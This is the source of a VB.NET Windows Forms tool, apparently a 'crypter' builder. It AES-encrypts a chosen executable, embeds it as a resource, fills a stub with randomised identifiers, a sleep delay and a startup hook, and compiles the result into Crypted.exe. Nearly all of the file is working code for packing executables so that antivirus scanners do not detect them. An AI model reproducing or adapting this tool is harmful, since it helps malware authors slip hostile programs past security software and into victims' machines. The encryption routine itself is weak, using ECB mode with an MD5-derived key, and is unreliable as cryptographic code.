Imports System.CodeDom.Compiler

Public Class Form1
    Private Sub btnBrowser_Click(sender As Object, e As EventArgs) Handles btnBrowser.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Executable |*.exe"
            If o.ShowDialog = DialogResult.OK Then
                txtbox_file.Text = o.FileName
            End If
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub btnCrypt_Click(sender As Object, e As EventArgs) Handles btnCrypt.Click
        Try
            txtKey.Text = Randomi(12)

            Dim Stub As String = My.Resources.Stub
            Stub = Replace(Stub, "%KEY%", txtKey.Text)
            Stub = Replace(Stub, "%sleep%", txtSleep.Text)
            Stub = Replace(Stub, "%Class%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%StartupSub%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%RunSub%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%Asm%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%Res%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%One%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "%Two%", Randomi(rand.Next(5, 10)))
            Stub = Replace(Stub, "'%STARTUP%", Nothing)

            Compiler(Application.StartupPath + "\Crypted.exe", Stub)
            MsgBox("Done")
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

    Public Shared rand As New Random()
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, validchars.Length)
            sb.Append(validchars.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v2.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:X86 /target:winexe"
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("system.data.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add("system.Deployment.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Web.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)

            Dim rw As New Resources.ResourceWriter(Application.StartupPath & "\Lime.Resources")
            rw.AddResource("FirstResource", AES_Encrypt(BytesToString(IO.File.ReadAllBytes(Form1.txtbox_file.Text)), Form1.txtKey.Text))
            rw.Close()
            .EmbeddedResources.Add(Application.StartupPath & "\Lime.Resources")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)

            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText)
                Next
            End If

        End With


    End Sub

    ' Thanks to pr0t0typ3 for adding the details about loops and strings.
    Public Shared Function iformat(ByVal input As Byte()) As String ' Codedom has maximum of possible chars per line so we are storing the string in multiple strings
        Dim out As New System.Text.StringBuilder ' Declaring a new StringBuilder to store the output string
        Dim base64data As String = Convert.ToBase64String(input) ' Get a readable String from the Byte Array
        Dim arr As String() = SplitString(base64data, 50000) ' Split the string into parts to fit in the Codedom-lines
        For i As Integer = 0 To arr.Length - 1 ' Looping thought each string in the array
            If i = arr.Length - 1 Then  ' If i equals the highest number
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else 'I is smaller than arr.Length - 1 (i < arr.Length - 1)
                out.Append(Chr(34) & arr(i) & Chr(34) & " + " & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function


    Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
        Dim amount As Long = Math.Ceiling(input.Length / partsize) 'Get Long value of the amount of parts using the formular (Length of Input / Length of Parts)
        Dim out(amount - 1) As String 'Declaring the Array to Return using the amount of Parts to define the size
        Dim currentpos As Long = 0 ' Declaring the Currentposition in the String
        For I As Integer = 0 To amount - 1 ' Looping thought each string in the array
            If I = amount - 1 Then ' If i equals the highest number
                Dim temp((input.Length - currentpos) - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part of the String
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos)) ' Current part is everything left from the string
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
            Else 'I is smaller than amount - 1 (i < amount - 1)
                Dim temp(partsize - 1) As Char ' Declaring a temporary Array of Chars for storing the current Part if the String using the Size of a part (partsize)
                input.CopyTo(currentpos, temp, 0, partsize) ' Copying the current Part to the temp array
                out(I) = Convert.ToString(temp) ' Current part is appended to the output string
                currentpos += partsize ' Currentposition is increase to catch the next part in the next "round" of the loop
            End If
        Next
        Return out ' Return the Output String
    End Function


    Public Shared Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function


    Private Shared Function BytesToString(ByVal Input As Byte()) As String
        Dim Result As New System.Text.StringBuilder(Input.Length * 2)
        Dim Part As String
        For Each b As Byte In Input
            Part = Conversion.Hex(b)
            If Part.Length = 1 Then Part = "0" & Part
            Result.Append(Part)
        Next
        Return Result.ToString()
    End Function

End Class
